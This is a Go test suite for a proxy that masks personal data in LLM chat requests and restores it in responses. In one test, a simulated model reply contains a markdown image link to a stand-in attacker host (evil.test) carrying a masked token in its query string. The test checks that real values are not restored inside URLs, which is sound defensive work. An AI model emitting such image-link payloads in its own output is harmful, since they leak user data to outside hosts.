package proxy

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/vikasgowda3007/pseudonymbench/internal/detect"
	"github.com/vikasgowda3007/pseudonymbench/internal/jsonx"
	"github.com/vikasgowda3007/pseudonymbench/internal/mask"
	"github.com/vikasgowda3007/pseudonymbench/internal/token"
	"github.com/vikasgowda3007/pseudonymbench/internal/vault"
)

// --- test rig --------------------------------------------------------------

type upstream struct {
	*httptest.Server
	mu      sync.Mutex
	bodies  []string
	headers []http.Header
	calls   atomic.Int32
}

func newUpstream(t *testing.T, h func(w http.ResponseWriter, r *http.Request, body []byte)) *upstream {
	t.Helper()
	u := &upstream{}
	u.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		u.calls.Add(1)
		u.mu.Lock()
		u.bodies = append(u.bodies, string(body))
		u.headers = append(u.headers, r.Header.Clone())
		u.mu.Unlock()
		h(w, r, body)
	}))
	t.Cleanup(u.Close)
	return u
}

func (u *upstream) lastBody() string {
	u.mu.Lock()
	defer u.mu.Unlock()
	return u.bodies[len(u.bodies)-1]
}

type syncBuf struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (s *syncBuf) Write(p []byte) (int, error) { s.mu.Lock(); defer s.mu.Unlock(); return s.b.Write(p) }
func (s *syncBuf) String() string              { s.mu.Lock(); defer s.mu.Unlock(); return s.b.String() }

// logged waits for the audit line of a finished request. The handler writes it
// in a deferred call, after the response has gone out, so a client can see the
// response a moment before the line exists.
func (s *syncBuf) logged(t *testing.T) string {
	t.Helper()
	for i := 0; i < 200; i++ {
		if out := s.String(); strings.HasSuffix(out, "\n") {
			return out
		}
		time.Sleep(5 * time.Millisecond)
	}
	t.Fatal("no audit line was written")
	return ""
}

type rig struct {
	url   string
	audit *syncBuf
	vault *vault.Memory
}

func newRig(t *testing.T, up *upstream, mod func(*Config)) rig {
	t.Helper()
	u, _ := url.Parse(up.URL)
	v := vault.NewMemory(vault.MemoryOptions{})
	audit := &syncBuf{}
	cfg := Config{
		Upstream: u, Masker: mask.New(nil), Vault: v, SessionKey: []byte("test-session-key"),
		ExposeCounts: true, Audit: slog.New(slog.NewJSONHandler(audit, nil)),
	}
	if mod != nil {
		mod(&cfg)
	}
	h, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(h)
	t.Cleanup(srv.Close)
	return rig{url: srv.URL, audit: audit, vault: v}
}

func chatBody(content string, stream bool) string {
	b, _ := jsonx.Encode(map[string]any{
		"model": "gpt-test", "stream": stream,
		"messages": []any{map[string]any{"role": "user", "content": content}},
	})
	return string(b)
}

func post(t *testing.T, rg rig, body string, hdr map[string]string) *http.Response {
	t.Helper()
	req, _ := http.NewRequest(http.MethodPost, rg.url+"/v1/chat/completions", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer sk-test")
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { resp.Body.Close() })
	return resp
}

// userContent pulls the last user message out of a request body.
func userContent(body []byte) string {
	var req struct {
		Messages []struct{ Role, Content string } `json:"messages"`
	}
	json.Unmarshal(body, &req)
	return req.Messages[len(req.Messages)-1].Content
}

// echoJSON replies with a completion that repeats the user's (masked) text.
func echoJSON(w http.ResponseWriter, r *http.Request, body []byte) {
	w.Header().Set("Content-Type", "application/json")
	out, _ := jsonx.Encode(map[string]any{
		"id": "chatcmpl-1", "object": "chat.completion", "model": "gpt-test",
		"choices": []any{map[string]any{"index": 0, "finish_reason": "stop",
			"message": map[string]any{"role": "assistant", "content": "Noted: " + userContent(body)}}},
	})
	w.Write(out)
}

// echoSSE streams the same reply in small pieces so tokens split across chunks.
func echoSSE(piece int) func(http.ResponseWriter, *http.Request, []byte) {
	return func(w http.ResponseWriter, r *http.Request, body []byte) {
		w.Header().Set("Content-Type", "text/event-stream")
		fl := w.(http.Flusher)
		text := "Noted: " + userContent(body)
		send := func(delta map[string]any, finish any) {
			b, _ := jsonx.Encode(map[string]any{"id": "c1", "object": "chat.completion.chunk", "model": "m",
				"choices": []any{map[string]any{"index": 0, "delta": delta, "finish_reason": finish}}})
			fmt.Fprintf(w, "data: %s\n\n", b)
			fl.Flush()
		}
		for i := 0; i < len(text); i += piece {
			send(map[string]any{"content": text[i:min(i+piece, len(text))]}, nil)
		}
		send(map[string]any{}, "stop")
		io.WriteString(w, "data: [DONE]\n\n")
		fl.Flush()
	}
}

func completionText(t *testing.T, resp *http.Response) string {
	t.Helper()
	b, _ := io.ReadAll(resp.Body)
	var c struct {
		Choices []struct{ Message struct{ Content string } }
	}
	if err := json.Unmarshal(b, &c); err != nil || len(c.Choices) == 0 {
		t.Fatalf("bad completion body (%d): %s", resp.StatusCode, b)
	}
	return c.Choices[0].Message.Content
}

func streamText(t *testing.T, resp *http.Response) string {
	t.Helper()
	var sb strings.Builder
	sc := bufio.NewScanner(resp.Body)
	sc.Buffer(make([]byte, 1<<20), 1<<20)
	for sc.Scan() {
		data, ok := strings.CutPrefix(sc.Text(), "data: ")
		if !ok || data == "[DONE]" {
			continue
		}
		var c struct {
			Choices []struct{ Delta struct{ Content string } }
		}
		if err := json.Unmarshal([]byte(data), &c); err != nil {
			t.Fatalf("bad event %q: %v", data, err)
		}
		for _, ch := range c.Choices {
			sb.WriteString(ch.Delta.Content)
		}
	}
	return sb.String()
}

const prompt = "Email john@acme.com about card 4111 1111 1111 1111"

// --- tests -----------------------------------------------------------------

func TestNonStreamRoundTrip(t *testing.T) {
	up := newUpstream(t, echoJSON)
	rg := newRig(t, up, nil)
	resp := post(t, rg, chatBody(prompt, false), map[string]string{SessionHeader: "chat-1"})

	sent := up.lastBody()
	for _, secret := range []string{"john@acme.com", "4111"} {
		if strings.Contains(sent, secret) {
			t.Fatalf("upstream received %q: %s", secret, sent)
		}
	}
	if got := completionText(t, resp); got != "Noted: "+prompt {
		t.Errorf("client got %q", got)
	}
	if h := resp.Header.Get(MaskedHeader); h != "CARD=1,EMAIL=1" {
		t.Errorf("%s = %q", MaskedHeader, h)
	}
	hdr := up.headers[0]
	if hdr.Get("Authorization") != "Bearer sk-test" {
		t.Error("Authorization was not forwarded")
	}
	if hdr.Get(SessionHeader) != "" {
		t.Error("session header leaked upstream")
	}
	if hdr.Get("Accept-Encoding") != "identity" {
		t.Errorf("Accept-Encoding = %q", hdr.Get("Accept-Encoding"))
	}
}

func TestStreamRoundTrip(t *testing.T) {
	for _, piece := range []int{1, 2, 3, 5, 7, 64} {
		up := newUpstream(t, echoSSE(piece))
		rg := newRig(t, up, nil)
		resp := post(t, rg, chatBody(prompt, true), nil)
		if ct := resp.Header.Get("Content-Type"); ct != "text/event-stream" {
			t.Fatalf("Content-Type = %q", ct)
		}
		if got := streamText(t, resp); got != "Noted: "+prompt {
			t.Errorf("piece %d: client got %q", piece, got)
		}
		if strings.Contains(up.lastBody(), "john@acme.com") {
			t.Errorf("piece %d: PII reached upstream", piece)
		}
	}
}

func TestStreamIsDeliveredIncrementally(t *testing.T) {
	release := make(chan struct{})
	up := newUpstream(t, func(w http.ResponseWriter, r *http.Request, body []byte) {
		w.Header().Set("Content-Type", "text/event-stream")
		io.WriteString(w, `data: {"choices":[{"index":0,"delta":{"content":"first"},"finish_reason":null}]}`+"\n\n")
		w.(http.Flusher).Flush()
		<-release
		io.WriteString(w, `data: {"choices":[{"index":0,"delta":{"content":" second"},"finish_reason":null}]}`+"\n\n")
		io.WriteString(w, "data: [DONE]\n\n")
	})
	rg := newRig(t, up, nil)
	resp := post(t, rg, chatBody("hello", true), nil)

	got := make(chan string, 1)
	go func() {
		line, _ := bufio.NewReader(resp.Body).ReadString('\n')
		got <- line
	}()
	select {
	case line := <-got:
		if !strings.Contains(line, "first") {
			t.Errorf("first line = %q", line)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("first event not delivered while the upstream was still streaming")
	}
	close(release)
}

func TestFailsClosed(t *testing.T) {
	up := newUpstream(t, echoJSON)
	rg := newRig(t, up, func(c *Config) {
		c.Masker = mask.New(mask.Policy{detect.SSN: mask.ActionBlock})
		c.MaxBodyBytes = 2048
	})
	do := func(method, path, ctype, body string, hdr map[string]string) *http.Response {
		req, _ := http.NewRequest(method, rg.url+path, strings.NewReader(body))
		if ctype != "" {
			req.Header.Set("Content-Type", ctype)
		}
		for k, v := range hdr {
			req.Header.Set(k, v)
		}
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		return resp
	}
	tests := []struct {
		name   string
		resp   *http.Response
		status int
	}{
		{"invalid json", do("POST", chatPath, "application/json", `{"messages":`, nil), 400},
		{"not an object", do("POST", chatPath, "application/json", `[1]`, nil), 400},
		{"wrong content type", do("POST", chatPath, "text/plain", chatBody(prompt, false), nil), 415},
		{"gzip body", do("POST", chatPath, "application/json", "x", map[string]string{"Content-Encoding": "gzip"}), 415},
		{"too large", do("POST", chatPath, "application/json", chatBody(strings.Repeat("a", 4096), false), nil), 413},
		{"blocked kind", do("POST", chatPath, "application/json", chatBody("ssn 078-05-1120", false), nil), 422},
		{"bad session id", do("POST", chatPath, "application/json", chatBody("hi", false), map[string]string{SessionHeader: "a b"}), 400},
		{"wrong method", do("GET", chatPath, "", "", nil), 405},
		{"embeddings path", do("POST", "/v1/embeddings", "application/json", `{"input":"john@acme.com"}`, nil), 403},
		{"completions path", do("POST", "/v1/completions", "application/json", `{"prompt":"john@acme.com"}`, nil), 403},
	}
	for _, tc := range tests {
		if tc.resp.StatusCode != tc.status {
			t.Errorf("%s: status %d, want %d", tc.name, tc.resp.StatusCode, tc.status)
		}
	}
	if n := up.calls.Load(); n != 0 {
		t.Fatalf("upstream was called %d times; rejected requests must not be forwarded", n)
	}
}

func TestBlockedResponseNamesKindsOnly(t *testing.T) {
	up := newUpstream(t, echoJSON)
	rg := newRig(t, up, func(c *Config) { c.Masker = mask.New(mask.Policy{detect.SSN: mask.ActionBlock}) })
	resp := post(t, rg, chatBody("my ssn is 078-05-1120", false), nil)
	b, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 422 || !strings.Contains(string(b), "SSN") || strings.Contains(string(b), "078") {
		t.Errorf("status %d body %s", resp.StatusCode, b)
	}
}

func TestVaultFailureFailsClosed(t *testing.T) {
	up := newUpstream(t, echoJSON)
	rg := newRig(t, up, func(c *Config) { c.Vault = vault.NewMemory(vault.MemoryOptions{MaxPerSession: 1}) })
	resp := post(t, rg, chatBody("a@acme.com and b@acme.com", false), map[string]string{SessionHeader: "s"})
	if resp.StatusCode != 503 || up.calls.Load() != 0 {
		t.Errorf("status %d, upstream calls %d", resp.StatusCode, up.calls.Load())
	}
}

func TestUnreachableUpstream(t *testing.T) {
	up := newUpstream(t, echoJSON)
	rg := newRig(t, up, nil)
	up.Close()
	resp := post(t, rg, chatBody("hello", false), nil)
	if resp.StatusCode != 502 {
		t.Errorf("status %d, want 502", resp.StatusCode)
	}
}

func TestSessionContinuityAndIsolation(t *testing.T) {
	// The upstream replies with whatever tokens appeared in an earlier request.
	var remembered atomic.Value
	up := newUpstream(t, func(w http.ResponseWriter, r *http.Request, body []byte) {
		if c := userContent(body); strings.Contains(c, "<EMAIL_") {
			remembered.Store(c)
		}
		w.Header().Set("Content-Type", "application/json")
		prev, _ := remembered.Load().(string)
		out, _ := jsonx.Encode(map[string]any{"choices": []any{map[string]any{"message": map[string]any{"content": "earlier: " + prev}}}})
		w.Write(out)
	})
	rg := newRig(t, up, nil)
	hdr := func(auth string) map[string]string {
		return map[string]string{SessionHeader: "chat-1", "Authorization": auth}
	}
	post(t, rg, chatBody("my mail is john@acme.com", false), hdr("Bearer A")).Body.Close()

	same := completionText(t, post(t, rg, chatBody("what was it?", false), hdr("Bearer A")))
	if !strings.Contains(same, "john@acme.com") {
		t.Errorf("same caller and session did not restore: %q", same)
	}
	other := completionText(t, post(t, rg, chatBody("what was it?", false), hdr("Bearer B")))
	if strings.Contains(other, "john@acme.com") || !strings.Contains(other, "<EMAIL_") {
		t.Errorf("another credential read this session's token: %q", other)
	}
	noSession := completionText(t, post(t, rg, chatBody("what was it?", false), map[string]string{"Authorization": "Bearer A"}))
	if strings.Contains(noSession, "john@acme.com") {
		t.Errorf("request without a session header restored an old token: %q", noSession)
	}
}

func TestSameSessionSameToken(t *testing.T) {
	up := newUpstream(t, echoJSON)
	rg := newRig(t, up, nil)
	h := map[string]string{SessionHeader: "s1"}
	post(t, rg, chatBody("john@acme.com", false), h).Body.Close()
	first := userContent([]byte(up.lastBody()))
	post(t, rg, chatBody("again john@acme.com", false), h).Body.Close()
	second := userContent([]byte(up.lastBody()))
	if !strings.HasSuffix(second, first) {
		t.Errorf("token changed within a session: %q then %q", first, second)
	}
}

func TestAuditLogHasCountsNotValues(t *testing.T) {
	up := newUpstream(t, echoJSON)
	rg := newRig(t, up, nil)
	secrets := []string{"john@acme.com", "4111 1111 1111 1111", "078-05-1120", "415-555-2671", "sk-test", "chat-secret-session"}
	body := chatBody("mail john@acme.com card 4111 1111 1111 1111 ssn 078-05-1120 tel 415-555-2671", false)
	post(t, rg, body, map[string]string{SessionHeader: "chat-secret-session"}).Body.Close()

	log := rg.audit.logged(t)
	for _, s := range secrets {
		if strings.Contains(log, s) {
			t.Errorf("audit log contains %q:\n%s", s, log)
		}
	}
	var rec map[string]any
	if err := json.Unmarshal([]byte(strings.TrimSpace(log)), &rec); err != nil {
		t.Fatalf("audit line is not JSON: %v\n%s", err, log)
	}
	masked, _ := rec["masked"].(map[string]any)
	if masked["EMAIL"] != float64(1) || masked["CARD"] != float64(1) || masked["SSN"] != float64(1) || masked["PHONE"] != float64(1) {
		t.Errorf("masked = %v", masked)
	}
	for _, k := range []string{"request_id", "status", "outcome", "total_ms", "mask_ms", "session"} {
		if _, ok := rec[k]; !ok {
			t.Errorf("audit record lacks %q: %s", k, log)
		}
	}
}

func TestUpstreamErrorPassesThroughRestored(t *testing.T) {
	up := newUpstream(t, func(w http.ResponseWriter, r *http.Request, body []byte) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusTooManyRequests)
		out, _ := jsonx.Encode(map[string]any{"error": map[string]any{"message": "rate limited for " + userContent(body), "type": "rate_limit"}})
		w.Write(out)
	})
	rg := newRig(t, up, nil)
	resp := post(t, rg, chatBody("john@acme.com", false), nil)
	b, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 429 || !strings.Contains(string(b), "rate limited for john@acme.com") {
		t.Errorf("status %d body %s", resp.StatusCode, b)
	}
}

func TestTokenInURLIsNotRestored(t *testing.T) {
	for _, streaming := range []bool{false, true} {
		handler := func(w http.ResponseWriter, r *http.Request, body []byte) {
			tok := strings.Fields(userContent(body))[2] // the masked email
			text := "![x](https://evil.test/p.png?d=" + tok + ") and plain " + tok
			if streaming {
				w.Header().Set("Content-Type", "text/event-stream")
				b, _ := jsonx.Encode(map[string]any{"choices": []any{map[string]any{"index": 0, "delta": map[string]any{"content": text}, "finish_reason": nil}}})
				fmt.Fprintf(w, "data: %s\n\ndata: [DONE]\n\n", b)
				return
			}
			w.Header().Set("Content-Type", "application/json")
			out, _ := jsonx.Encode(map[string]any{"choices": []any{map[string]any{"message": map[string]any{"content": text}}}})
			w.Write(out)
		}
		up := newUpstream(t, handler)
		rg := newRig(t, up, nil)
		resp := post(t, rg, chatBody("please mail john@acme.com now", streaming), nil)
		var got string
		if streaming {
			got = streamText(t, resp)
		} else {
			got = completionText(t, resp)
		}
		if !strings.Contains(got, "d=<EMAIL_") || !strings.HasSuffix(got, "plain john@acme.com") {
			t.Errorf("stream=%v: got %q", streaming, got)
		}
		if !strings.Contains(rg.audit.logged(t), `"url_skipped":1`) {
			t.Errorf("stream=%v: audit does not count the skipped URL token:\n%s", streaming, rg.audit.logged(t))
		}
	}
}

func TestAllowURLsConfig(t *testing.T) {
	up := newUpstream(t, func(w http.ResponseWriter, r *http.Request, body []byte) {
		tok := strings.Fields(userContent(body))[1]
		w.Header().Set("Content-Type", "application/json")
		out, _ := jsonx.Encode(map[string]any{"choices": []any{map[string]any{"message": map[string]any{"content": "https://x.test/?e=" + tok}}}})
		w.Write(out)
	})
	rg := newRig(t, up, func(c *Config) { c.AllowURLs = true })
	if got := completionText(t, post(t, rg, chatBody("mail john@acme.com", false), nil)); got != "https://x.test/?e=john@acme.com" {
		t.Errorf("got %q", got)
	}
}

func TestEndpointsAndPrefix(t *testing.T) {
	var gotPath atomic.Value
	up := newUpstream(t, func(w http.ResponseWriter, r *http.Request, body []byte) {
		gotPath.Store(r.URL.Path)
		w.Header().Set("Content-Type", "application/json")
		io.WriteString(w, `{"data":[]}`)
	})
	rg := newRig(t, up, func(c *Config) { c.Upstream.Path = "/openai/" })

	resp, _ := http.Get(rg.url + "/healthz")
	if resp.StatusCode != 200 {
		t.Errorf("healthz = %d", resp.StatusCode)
	}
	resp, _ = http.Get(rg.url + "/v1/models")
	if resp.StatusCode != 200 || gotPath.Load() != "/openai/v1/models" {
		t.Errorf("models: status %d, upstream path %v", resp.StatusCode, gotPath.Load())
	}
	post(t, rg, chatBody("hi", false), nil).Body.Close()
	if gotPath.Load() != "/openai/v1/chat/completions" {
		t.Errorf("chat upstream path = %v", gotPath.Load())
	}
}

func TestConcurrentRequests(t *testing.T) {
	up := newUpstream(t, echoSSE(3))
	rg := newRig(t, up, nil)
	var wg sync.WaitGroup
	for i := 0; i < 40; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			p := fmt.Sprintf("mail user%d@acme.com about card 4111 1111 1111 1111", i)
			resp := post(t, rg, chatBody(p, i%2 == 0), map[string]string{SessionHeader: fmt.Sprintf("s%d", i%5)})
			var got string
			if i%2 == 0 {
				got = streamText(t, resp)
			} else {
				b, _ := io.ReadAll(resp.Body)
				got = string(b)
				return // echoSSE always streams; only the stream half is checked for text
			}
			if got != "Noted: "+p {
				t.Errorf("request %d: got %q", i, got)
			}
		}(i)
	}
	wg.Wait()
}

func TestClientCancelStopsUpstream(t *testing.T) {
	cancelled := make(chan struct{})
	up := newUpstream(t, func(w http.ResponseWriter, r *http.Request, body []byte) {
		w.Header().Set("Content-Type", "text/event-stream")
		io.WriteString(w, `data: {"choices":[{"index":0,"delta":{"content":"hi"},"finish_reason":null}]}`+"\n\n")
		w.(http.Flusher).Flush()
		select {
		case <-r.Context().Done():
			close(cancelled)
		case <-time.After(5 * time.Second):
		}
	})
	rg := newRig(t, up, nil)
	ctx, cancel := context.WithCancel(context.Background())
	req, _ := http.NewRequestWithContext(ctx, http.MethodPost, rg.url+chatPath, strings.NewReader(chatBody("hello", true)))
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	bufio.NewReader(resp.Body).ReadString('\n')
	cancel()
	select {
	case <-cancelled:
	case <-time.After(2 * time.Second):
		t.Fatal("upstream request kept running after the client went away")
	}
}

func TestNewValidatesConfig(t *testing.T) {
	if _, err := New(Config{}); err == nil {
		t.Error("empty config accepted")
	}
	u, _ := url.Parse("http://x.test")
	if _, err := New(Config{Upstream: u}); err == nil {
		t.Error("config without masker, vault and key accepted")
	}
}

// A model may rewrite a token instead of copying it. Restoration is an exact
// match by design: a changed token must come back as the model wrote it, never
// as the real value and never as someone else's.
func TestMangledTokensStayVisible(t *testing.T) {
	mangle := map[string]func(string) string{
		"lowercase":   strings.ToLower,
		"no-brackets": func(s string) string { return strings.Trim(s, "<>") },
		"spaced":      func(s string) string { return strings.Replace(s, "_", " _ ", 1) },
		"truncated":   func(s string) string { return s[:len(s)/2] },
		"swapped-id":  func(s string) string { return s[:len(s)-2] + "00>" },
	}
	for name, fn := range mangle {
		for _, streaming := range []bool{false, true} {
			up := newUpstream(t, func(w http.ResponseWriter, r *http.Request, body []byte) {
				tok := strings.Fields(userContent(body))[2] // masked email
				text := "reply " + fn(tok) + " end"
				if streaming {
					w.Header().Set("Content-Type", "text/event-stream")
					for _, piece := range []string{text[:9], text[9:]} {
						b, _ := jsonx.Encode(map[string]any{"choices": []any{map[string]any{"index": 0, "delta": map[string]any{"content": piece}, "finish_reason": nil}}})
						fmt.Fprintf(w, "data: %s\n\n", b)
					}
					io.WriteString(w, "data: [DONE]\n\n")
					return
				}
				w.Header().Set("Content-Type", "application/json")
				out, _ := jsonx.Encode(map[string]any{"choices": []any{map[string]any{"message": map[string]any{"content": text}}}})
				w.Write(out)
			})
			rg := newRig(t, up, nil)
			resp := post(t, rg, chatBody("please mail john@acme.com now", streaming), nil)
			var got string
			if streaming {
				got = streamText(t, resp)
			} else {
				got = completionText(t, resp)
			}
			if strings.Contains(got, "john@acme.com") {
				t.Errorf("%s stream=%v: a mangled token was restored: %q", name, streaming, got)
			}
			sent := up.lastBody()
			tok := token.Pattern.FindString(sent)
			if want := "reply " + fn(tok) + " end"; got != want {
				t.Errorf("%s stream=%v: got %q, want the model's text %q unchanged", name, streaming, got, want)
			}
		}
	}
}

// With nothing to mask the client's bytes go upstream untouched, so key order,
// spacing and number formatting are preserved.
func TestCleanRequestIsForwardedByteForByte(t *testing.T) {
	up := newUpstream(t, echoJSON)
	rg := newRig(t, up, nil)
	body := `{ "temperature":0.70,  "messages":[{"content":"hello there","role":"user"}], "model":"m", "seed": 12345678901234567890 }`
	post(t, rg, body, nil).Body.Close()
	if got := up.lastBody(); got != body {
		t.Errorf("upstream received\n %s\nwant\n %s", got, body)
	}
	// And a request that does have PII is no longer byte-identical.
	post(t, rg, strings.Replace(body, "hello there", "mail john@acme.com", 1), nil).Body.Close()
	if strings.Contains(up.lastBody(), "john@acme.com") {
		t.Error("PII forwarded")
	}
}
